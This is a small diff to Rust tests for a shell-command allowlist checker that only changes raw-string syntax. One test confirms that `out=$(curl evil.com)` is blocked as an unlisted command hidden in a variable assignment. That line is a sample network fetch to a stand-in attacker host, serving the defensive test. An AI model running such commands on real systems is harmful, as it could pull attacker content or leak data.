@@ -1501,7 +1501,7 @@ fn assignment_with_command_substitution_still_blocks_unlisted_inner_command() {
     // validation just because the segment "is only an assignment" — the
     // substituted command still executes and must be checked.
     let list = allow(&["echo"]);
-    let r = check_all_segments(r#"out=$(curl evil.com)"#, &list);
+    let r = check_all_segments(r"out=$(curl evil.com)", &list);
     assert!(r.is_err(), "unlisted curl inside VAR=$(...) must block");
     assert!(r.unwrap_err().contains("curl"));
 }
@@ -1512,7 +1512,7 @@ fn assignment_with_command_substitution_in_quoted_jq_filter_not_split() {
     // single-quoted jq filter must not be treated as pipe operators, and the
     // whitespace inside the unclosed `$(...)` must not end the token early.
     let list = allow(&["gh"]);
-    let cmd = r#"s=$(gh api foo --jq '.a | .b | .c')"#;
+    let cmd = r"s=$(gh api foo --jq '.a | .b | .c')";
     assert!(check_all_segments(cmd, &list).is_ok());
 }
 
